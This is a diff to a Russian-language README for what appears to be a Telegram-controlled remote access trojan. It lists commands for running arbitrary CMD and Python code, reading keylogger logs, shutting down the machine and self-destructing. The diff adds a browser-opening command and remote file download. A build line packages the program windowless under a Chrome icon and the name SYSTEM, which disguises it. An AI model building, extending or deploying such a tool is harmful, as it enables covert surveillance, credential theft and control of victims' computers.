@@ -69,7 +69,8 @@ pyinstaller --onefile --noconsole --icon=googlechrome.ico --name=SYSTEM main.py
 * /shutdown — Выключить компьютер  
 * /reboot — Перезагрузить компьютер  
 * /cmd_exec <команда> — Выполнить команду через CMD  
-* /python_exec <код> — Выполнить Python-выражение или скрипт  
+* /python_exec <код> — Выполнить Python-выражение или скрипт
+* /open_browser <ссылка на сайт(можно оставить пустым)> — Открыть браузер/ссылку
 
 🔐 Логи и данные
 * /keylogs — Показать логи клавиш  
@@ -93,6 +94,8 @@ pyinstaller --onefile --noconsole --icon=googlechrome.ico --name=SYSTEM main.py
 
 ⚠️ Опасные команды
 * /self_destruct — Запрос на удаление бота  
+
+Можно отправить файл боту и он его скачает
 
 ---------------------------
 📁 Папки
